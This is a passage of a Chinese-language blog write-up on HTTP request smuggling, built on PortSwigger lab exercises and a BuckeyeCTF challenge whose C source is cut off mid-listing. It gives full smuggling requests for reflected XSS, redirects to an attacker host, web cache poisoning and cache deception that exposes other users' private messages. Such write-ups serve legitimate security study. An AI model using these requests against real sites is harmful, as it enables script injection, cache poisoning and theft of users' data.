&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>POST /post/comment HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 600
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;amp;postId=5&amp;amp;name=1&amp;amp;email=1%40qq.com&amp;amp;website=http%3A%2F%2Fwww.baidu.com&amp;amp;comment=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="加强版xss">加强版XSS&lt;/h4>
&lt;p>UA头有反射XSS，我们构造这样的payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ac811f011e27d43b80301693005a0007.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">150&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /post?postId=5 HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent: &amp;#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 5
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>只需要发送一次，之后任意访问页面都会弹窗，因为我们的请求嵌入到上面第二个请求中&lt;/p>
&lt;h4 id="修改重定向">修改重定向&lt;/h4>
&lt;p>目标在使用 30x 跳转的时候，使用了 Host 头进行跳转，例如在 Apache &amp;amp; IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/home&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">normal-website.com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们会得到 Response :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">301&lt;/span> &lt;span style="color:#75af00">Moved Permanently&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Location&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://normal-website.com/home/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">vulnerable-website.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">54&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /home HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: attacker-website.com
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Foo: X
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Smugle 之后的请求会像以下这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/home&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">attacker-website.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Foo&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">XGET /scripts/include.js HTTP/1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">vulnerable-website.com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">301&lt;/span> &lt;span style="color:#75af00">Moved Permanently&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Location&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">https://attacker-website.com/home/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样，受害者，也就是访问&lt;code>/scripts/include.js&lt;/code>这个的用户，会被跳转到我们控制的 url&lt;/p>
&lt;h4 id="缓存投毒">缓存投毒&lt;/h4>
&lt;p>&lt;a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning&lt;/a>&lt;/p>
&lt;p>基于上面的Host跳转的攻击场景，当前端服务器还存在缓存静态资源时可以配合smuggling进行缓存投毒&lt;/p>
&lt;p>在/post/next?postId=2的路由处有一个跳转的api供我们使用，这个路由跳转到/post?postId=4&lt;/p>
&lt;p>我们选择/resources/js/tracking.js进行投毒&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">ac7a1f141fadd93d801c469f005500bf.web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=f6c7ZBB52a6iedorGSywc8jM6USu4685&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/x-www-form-urlencoded&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">178&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /post/next?postId=3 HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: ac701fe61fabd97b8027465701f800a8.web-security-academy.net
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 10
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后再访问/resources/js/tracking.js会跳转到我们走私请求的url/post?postId=4，再访问正常主页就会alert&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220319205945177.png" alt="image-20220319205945177">&lt;/p>
&lt;p>在C请求的&lt;code>/resources/js/tracking.js&lt;/code>会被前端服务器认为是静态资源缓存起来，而我们利用HTTP Smuggling将这个请求导向了我们的vps，返回了&lt;code>alert(1)&lt;/code>给C请求，然后这个响应包就会被前端服务器缓存起来，这样我们就成功进行了投毒&lt;/p>
&lt;h4 id="缓存欺骗">缓存欺骗&lt;/h4>
&lt;p>在缓存投毒中，攻击者将恶意内容存储在缓存中 并将该内容从缓存中提供给其它应用程序用户，而在缓存欺骗中，攻击者使应用程序将一些属于另一个用户的敏感内容存储在缓存中，然后攻击者从缓存中检索该内容&lt;/p>
&lt;p>我们发送这样的请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">vulnerable-website.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">43&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Transfer-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">chunked&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /private/messages HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Foo: X
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>smuggle的请求会用&lt;code>Foo:X&lt;/code>覆盖下一个发过来的请求头的第一行（GET /xxx HTTP/1.1） 并且这个请求会带着用户的cookie去访问，类似CSRF，该请求就会变成这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">GET&lt;/span> &lt;span style="color:#111">/private/messages&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Foo&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">XGET /static/some-image.png HTTP/1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">vulnerable-website.com&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>多发送几次，一旦用户访问的是静态资源，就可能会被前端服务器缓存起来，我们就可以拿到用户/private/messages的信息了&lt;/p>
&lt;h3 id="in-ctf">in CTF&lt;/h3>
&lt;h4 id="buckeyectf-2021curly-fries">[BuckeyeCTF 2021]Curly fries&lt;/h4>
&lt;p>&lt;a href="https://github.com/cscosu/buckeyectf-2021/blob/master/web/curly_fries/dist/curly_fries.zip">file-link&lt;/a>&lt;/p>
&lt;p>用c的curl.h库实现curl的功能，接收一个我们输入的url，curl之后返回响应包的内容，看下c源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;curl/curl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">verify_flag_file&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Verify that the flag file still contains the flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">buf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">malloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">FILE&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">fp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">fopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./flag.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">fp&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">strstr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Congratulations! Here&amp;#39;s the flag: buckeye{&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">free&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">response_buf_size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">response_size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#75af00">header_callback&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">nitems&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">userdata&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">real_size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">size&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">nitems&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt; %.*s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">real_size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">strstr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Content-Length&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">||&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">strstr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;content-length&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 检查CL头 并不严谨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">__attribute__&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">unused&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">strtok&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
